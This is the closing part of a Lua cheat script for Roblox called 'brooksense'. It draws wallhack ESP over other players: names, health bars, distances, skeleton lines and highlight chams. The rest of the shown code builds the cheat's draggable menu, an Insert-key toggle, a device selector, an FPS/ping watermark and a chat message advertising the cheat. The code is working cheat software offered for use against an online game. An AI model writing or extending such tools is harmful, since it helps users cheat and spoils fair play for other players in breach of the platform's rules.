        BackgroundTransparency=1, Text=pl.DisplayName.." ["..pl.Name.."]",
        Font=Enum.Font.GothamBold, TextSize=13, TextColor3=EspColor(),
        TextStrokeTransparency=0.1, TextStrokeColor3=Color3.new(0,0,0),
        TextXAlignment=Enum.TextXAlignment.Center, Visible=State.NameESP, Parent=bb
    })

    local hpBg = N("Frame",{AnchorPoint=Vector2.new(0.5,0),Size=UDim2.new(0.9,0,0,5),Position=UDim2.new(0.5,0,0,20),BackgroundColor3=Color3.fromRGB(20,20,20),BorderSizePixel=0,Visible=State.HealthESP,Parent=bb})
    RND(2, hpBg)
    local hpF = N("Frame",{Size=UDim2.new(1,0,1,0),BackgroundColor3=Color3.fromRGB(80,200,80),BorderSizePixel=0,Parent=hpBg})
    RND(2, hpF)
    d.hpBg = hpBg; d.hpFill = hpF

    d.distLbl = N("TextLabel",{
        AnchorPoint=Vector2.new(0.5,0), Size=UDim2.new(1,0,0,14), Position=UDim2.new(0.5,0,0,28),
        BackgroundTransparency=1, Text="", Font=Enum.Font.Gotham, TextSize=10,
        TextColor3=Color3.fromRGB(130,130,150), TextStrokeTransparency=0.2, TextStrokeColor3=Color3.new(0,0,0),
        TextXAlignment=Enum.TextXAlignment.Center, Visible=State.DistESP, Parent=bb
    })

    -- Highlight (Chams)
    local hl = N("Highlight",{Name="GS_HL",FillColor=EspColor(),OutlineColor=EspColor(),FillTransparency=1,OutlineTransparency=0,Adornee=c,Parent=c})
    d.hl = hl

    ESPData[pl] = d
end

-- ESP Update Loop
RunService.RenderStepped:Connect(function()
    if not State.ESP then
        for pl in pairs(ESPData) do ClearESP(pl) end
        return
    end
    local ec = EspColor()
    for _, pl in ipairs(Players:GetPlayers()) do
        if pl ~= LP then
            local c = pl.Character
            if not c then
                ClearESP(pl)
            else
                local hrp = c:FindFirstChild("HumanoidRootPart")
                if not hrp then
                    ClearESP(pl)
                else
                    if not ESPData[pl] then BuildESP(pl) end
                    local d = ESPData[pl]
                    if d then
                        -- Update skeleton lines
                        if DrawingSupported and #d.lines > 0 then
                            local bones = GetBones(c)
                            for i, pair in ipairs(bones) do
                                local ln = d.lines[i]
                                if ln then
                                    local pA = c:FindFirstChild(pair[1])
                                    local pB = c:FindFirstChild(pair[2])
                                    if pA and pB then
                                        local sA, onA = Cam:WorldToViewportPoint(pA.Position)
                                        local sB, onB = Cam:WorldToViewportPoint(pB.Position)
                                        if sA.Z > 0 and sB.Z > 0 then
                                            ln.From = Vector2.new(sA.X, sA.Y)
                                            ln.To = Vector2.new(sB.X, sB.Y)
                                            ln.Color = ec
                                            ln.Visible = true
                                        else
                                            ln.Visible = false
                                        end
                                    else
                                        ln.Visible = false
                                    end
                                end
                            end
                        end

                        -- Update HP
                        local hum = c:FindFirstChildOfClass("Humanoid")
                        if hum and d.hpFill then
                            local r = math.clamp(hum.Health / math.max(hum.MaxHealth, 1), 0, 1)
                            d.hpFill.Size = UDim2.new(r, 0, 1, 0)
                            d.hpFill.BackgroundColor3 = Color3.fromRGB(math.floor(255*(1-r)), math.floor(255*r), 35)
                        end
                        if d.hpBg then d.hpBg.Visible = State.HealthESP end
                        if d.nameLbl then d.nameLbl.Visible = State.NameESP; d.nameLbl.TextColor3 = ec end
                        if d.distLbl then
                            d.distLbl.Text = math.floor((HRP.Position - hrp.Position).Magnitude).."m"
                            d.distLbl.Visible = State.DistESP
                        end
                        if d.hl then
                            d.hl.FillColor = ec; d.hl.OutlineColor = ec
                            d.hl.FillTransparency = State.Chams and 0.6 or 1
                        end
                    end
                end
            end
        end
    end
    -- cleanup removed players
    for pl in pairs(ESPData) do
        if not pl.Parent then ClearESP(pl) end
    end
end)

Players.PlayerRemoving:Connect(ClearESP)

-- ================================================================
-- RAINBOW TOP BAR ANIMATION
-- ================================================================
local rbHue = 0
RunService.RenderStepped:Connect(function(dt)
    rbHue = (rbHue + dt * 0.32) % 1
    local stops = {}
    for i = 0, 10 do
        table.insert(stops, ColorSequenceKeypoint.new(i/10, Color3.fromHSV(((rbHue + i/10) % 1), 1, 1)))
    end
    RbGrad.Color = ColorSequence.new(stops)
end)

-- ================================================================
-- DRAG SYSTEM
-- ================================================================
local dragActive, dragOffX, dragOffY = false, 0, 0

UserInputService.InputBegan:Connect(function(i, gp)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        local mp = i.Position
        local tp = TBar.AbsolutePosition
        local ts = TBar.AbsoluteSize
        if mp.X >= tp.X and mp.X <= tp.X + ts.X and mp.Y >= tp.Y and mp.Y <= tp.Y + ts.Y then
            dragActive = true
            dragOffX = mp.X - Win.AbsolutePosition.X
            dragOffY = mp.Y - Win.AbsolutePosition.Y
        end
    end
    -- Toggle GUI with Insert key (smooth fade using overlay)
    if i.KeyCode == Enum.KeyCode.Insert then
        local guiOpen = Win.Visible
        if guiOpen then
            -- Create fade overlay on top of everything
            local overlay = N("Frame", {
                Size = UDim2.new(1,0,1,0), BackgroundColor3 = C.Win,
                BackgroundTransparency = 1, BorderSizePixel = 0, ZIndex = 100, Parent = Win
            })
            TweenService:Create(overlay, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()
            TweenService:Create(Shadow, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
            task.spawn(function()
                task.wait(0.28)
                Win.Visible = false
                Shadow.Visible = false
                Shadow.BackgroundTransparency = 0.45
                overlay:Destroy()
            end)
        else
            -- Show with fade overlay removing
            Win.Visible = true
            Shadow.Visible = true
            Shadow.BackgroundTransparency = 1
            local overlay = N("Frame", {
                Size = UDim2.new(1,0,1,0), BackgroundColor3 = C.Win,
                BackgroundTransparency = 0, BorderSizePixel = 0, ZIndex = 100, Parent = Win
            })
            TweenService:Create(overlay, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 1}):Play()
            TweenService:Create(Shadow, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.45}):Play()
            task.spawn(function()
                task.wait(0.35)
                overlay:Destroy()
            end)
        end
    end
end)

UserInputService.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        dragActive = false
    end
end)

UserInputService.InputChanged:Connect(function(i)
    if dragActive and i.UserInputType == Enum.UserInputType.MouseMovement then
        local nx = math.clamp(i.Position.X - dragOffX, 0, Cam.ViewportSize.X - WW)
        local ny = math.clamp(i.Position.Y - dragOffY, 0, Cam.ViewportSize.Y - WH)
        Win.Position = UDim2.new(0, nx, 0, ny)
        Shadow.Position = UDim2.new(0, nx - 4, 0, ny - 4)
    end
end)

-- ================================================================
-- INTRO ANIMATION + STARTUP ACTIONS
-- ================================================================
Win.Visible = false
Shadow.Visible = false

task.spawn(function()
    -- Intro fade in
    task.wait(0.15)
    TW(ILbl, 0.6, {TextTransparency=0}, Enum.EasingStyle.Quint)
    task.wait(0.7)
    TW(ISub, 0.4, {TextTransparency=0})
    task.wait(1.5)
    TW(ILbl, 0.3, {TextTransparency=1})
    TW(ISub, 0.3, {TextTransparency=1})
    task.wait(0.4)
    TW(Intro, 0.5, {BackgroundTransparency=1})
    task.wait(0.5)
    Intro.Visible = false

    -- DEVICE SELECTOR SCREEN
    local DeviceScreen = N("Frame",{Size=UDim2.new(1,0,1,0),BackgroundColor3=Color3.fromRGB(12,12,16),BackgroundTransparency=0,BorderSizePixel=0,ZIndex=150,Parent=SG})
    local DSTitle = N("TextLabel",{
        AnchorPoint=Vector2.new(0.5,0), Size=UDim2.new(0,400,0,40),
        Position=UDim2.new(0.5,0,0.15,0), BackgroundTransparency=1, RichText=true,
        Text='<font color="#B0B0C0">brook</font><font color="#C837C8">sense</font>',
        Font=Enum.Font.GothamBold, TextSize=28, TextColor3=C.Txt, ZIndex=151, Parent=DeviceScreen
    })
    local DSSub = N("TextLabel",{
        AnchorPoint=Vector2.new(0.5,0), Size=UDim2.new(0,400,0,20),
        Position=UDim2.new(0.5,0,0.23,0), BackgroundTransparency=1,
        Text="Select your device", Font=Enum.Font.Gotham, TextSize=14,
        TextColor3=C.TxtD, ZIndex=151, Parent=DeviceScreen
    })

    -- PC Button
    local PCBtn = N("TextButton",{
        AnchorPoint=Vector2.new(0.5,0.5), Size=UDim2.new(0,140,0,140),
        Position=UDim2.new(0.35,0,0.55,0), BackgroundColor3=Color3.fromRGB(28,28,36),
        BorderSizePixel=0, Text="", AutoButtonColor=false, ZIndex=152, Parent=DeviceScreen
    })
    RND(10, PCBtn); BDR(C.GBdr, 1, PCBtn)
    N("TextLabel",{
        AnchorPoint=Vector2.new(0.5,0.5), Size=UDim2.new(1,0,0,50),
        Position=UDim2.new(0.5,0,0.4,0), BackgroundTransparency=1,
        Text="🖥️", TextSize=42, ZIndex=153, Parent=PCBtn
    })
    N("TextLabel",{
        AnchorPoint=Vector2.new(0.5,0), Size=UDim2.new(1,0,0,20),
        Position=UDim2.new(0.5,0,0.72,0), BackgroundTransparency=1,
        Text="PC", Font=Enum.Font.GothamBold, TextSize=14, TextColor3=C.Txt, ZIndex=153, Parent=PCBtn
    })

    -- Mobile Button
    local MobileBtn = N("TextButton",{
        AnchorPoint=Vector2.new(0.5,0.5), Size=UDim2.new(0,140,0,140),
        Position=UDim2.new(0.65,0,0.55,0), BackgroundColor3=Color3.fromRGB(28,28,36),
        BorderSizePixel=0, Text="", AutoButtonColor=false, ZIndex=152, Parent=DeviceScreen
    })
    RND(10, MobileBtn); BDR(C.GBdr, 1, MobileBtn)
    N("TextLabel",{
        AnchorPoint=Vector2.new(0.5,0.5), Size=UDim2.new(1,0,0,50),
        Position=UDim2.new(0.5,0,0.4,0), BackgroundTransparency=1,
        Text="📱", TextSize=42, ZIndex=153, Parent=MobileBtn
    })
    N("TextLabel",{
        AnchorPoint=Vector2.new(0.5,0), Size=UDim2.new(1,0,0,20),
        Position=UDim2.new(0.5,0,0.72,0), BackgroundTransparency=1,
        Text="Mobile", Font=Enum.Font.GothamBold, TextSize=14, TextColor3=C.Txt, ZIndex=153, Parent=MobileBtn
    })

    -- Hover effects
    PCBtn.MouseEnter:Connect(function() TW(PCBtn, 0.2, {BackgroundColor3=Color3.fromRGB(40,40,52)}) end)
    PCBtn.MouseLeave:Connect(function() TW(PCBtn, 0.2, {BackgroundColor3=Color3.fromRGB(28,28,36)}) end)
    MobileBtn.MouseEnter:Connect(function() TW(MobileBtn, 0.2, {BackgroundColor3=Color3.fromRGB(40,40,52)}) end)
    MobileBtn.MouseLeave:Connect(function() TW(MobileBtn, 0.2, {BackgroundColor3=Color3.fromRGB(28,28,36)}) end)

    local isMobile = false

    local function showMainMenu()
        TW(DeviceScreen, 0.3, {BackgroundTransparency=1})
        task.wait(0.35)
        DeviceScreen.Visible = false

        if isMobile then
            -- MOBILE: bigger window, bigger buttons, no tab sidebar
            Win.Size = UDim2.new(0.92, 0, 0.8, 0)
            Win.Position = UDim2.new(0.04, 0, 0.1, 0)
            Shadow.Size = UDim2.new(0.94, 0, 0.82, 0)
            Shadow.Position = UDim2.new(0.03, 0, 0.09, 0)
            -- Make tab bar horizontal at top instead of vertical
            TabBar.Position = UDim2.new(0, 0, 0, HDR_H)
            TabBar.Size = UDim2.new(1, 0, 0, 35)
            Content.Position = UDim2.new(0, 0, 0, HDR_H + 36)
            Content.Size = UDim2.new(1, 0, 1, -(HDR_H + 36))
            -- Rearrange tab buttons horizontally
            for i, name in ipairs(tabDefs) do
                local btn = TabBtns[name]
                btn.Size = UDim2.new(0, math.floor((vp.X * 0.92) / #tabDefs), 0, 34)
                btn.Position = UDim2.new(0, (i-1) * math.floor((vp.X * 0.92) / #tabDefs), 0, 0)
                btn.TextSize = 9
            end
        end

        -- Show window (same animation for both)
        Win.Visible = true
        Shadow.Visible = true
        Win.BackgroundTransparency = 1
        Shadow.BackgroundTransparency = 1
        TW(Win, 0.4, {BackgroundTransparency=0}, Enum.EasingStyle.Quint)
        TW(Shadow, 0.4, {BackgroundTransparency=0.45})
        TBar.BackgroundTransparency = 1
        TabBar.BackgroundTransparency = 1
        Content.BackgroundTransparency = 1
        TW(TBar, 0.35, {BackgroundTransparency=0})
        TW(TabBar, 0.35, {BackgroundTransparency=0})
        TW(Content, 0.35, {BackgroundTransparency=0})
    end

    PCBtn.MouseButton1Click:Connect(function()
        isMobile = false
        showMainMenu()
    end)

    MobileBtn.MouseButton1Click:Connect(function()
        isMobile = true
        showMainMenu()
    end)

    -- Chat message on join (once)
    task.spawn(function()
        task.wait(4)
        SendChat("brook.sense "..VERSION.." by kencsar")
    end)
end)

-- ================================================================
-- WATERMARK (GameSense style - top right: FPS | Ping | Time)
-- ================================================================
local WM = N("Frame",{
    AnchorPoint = Vector2.new(1, 0),
    Position = UDim2.new(1, -12, 0, 8),
    Size = UDim2.new(0, 220, 0, 22),
    BackgroundColor3 = Color3.fromRGB(20, 20, 24),
    BackgroundTransparency = 0.15,
    BorderSizePixel = 0,
    ZIndex = 50,
    Parent = SG
})
RND(3, WM)
BDR(Color3.fromRGB(50, 50, 65), 1, WM)

-- Accent line on top of watermark
local WMBar = N("Frame",{
    Size = UDim2.new(1, 0, 0, 2),
    Position = UDim2.new(0, 0, 0, 0),
    BackgroundColor3 = C.Acc,
    BorderSizePixel = 0,
    ZIndex = 51,
    Parent = WM
})
RND(3, WMBar)

local WMLbl = N("TextLabel",{
    Size = UDim2.new(1, -8, 1, -2),
    Position = UDim2.new(0, 4, 0, 2),
    BackgroundTransparency = 1,
    Text = "brooksense | 0 fps | 0ms",
    Font = Enum.Font.Code,
    TextSize = 11,
    TextColor3 = Color3.fromRGB(220, 220, 225),
    TextXAlignment = Enum.TextXAlignment.Center,
    ZIndex = 52,
    Parent = WM
})

-- FPS + Ping counter loop
local fpsCount, fpsTick = 0, tick()
RunService.RenderStepped:Connect(function()
    fpsCount = fpsCount + 1
    local now = tick()
    if now - fpsTick >= 1 then
        local fps = math.floor(fpsCount / (now - fpsTick))
        local ping = 0
        pcall(function()
            ping = math.floor(game:GetService("Stats"):FindFirstChild("PerformanceStats"):FindFirstChild("Ping"):GetValue())
        end)
        -- fallback ping method
        if ping == 0 then
            pcall(function()
                ping = math.floor(LP:GetNetworkPing() * 1000)
            end)
        end
        local timeStr = os.date("%H:%M:%S")
        WMLbl.Text = string.format("brooksense | %d fps | %dms | %s", fps, ping, timeStr)
        -- Auto-resize watermark
        local tw = WMLbl.TextBounds.X
        WM.Size = UDim2.new(0, math.max(tw + 16, 180), 0, 22)
        fpsCount = 0
        fpsTick = now
    end
end)

print("[brooksense "..VERSION.." | by kencsar]  INSERT = show/hide  |  loaded successfully!")

end, function(e)
    return tostring(e) .. "\n" .. debug.traceback()
end)
if not ok then
    warn("[brooksense CRITICAL ERROR] " .. tostring(err))
end
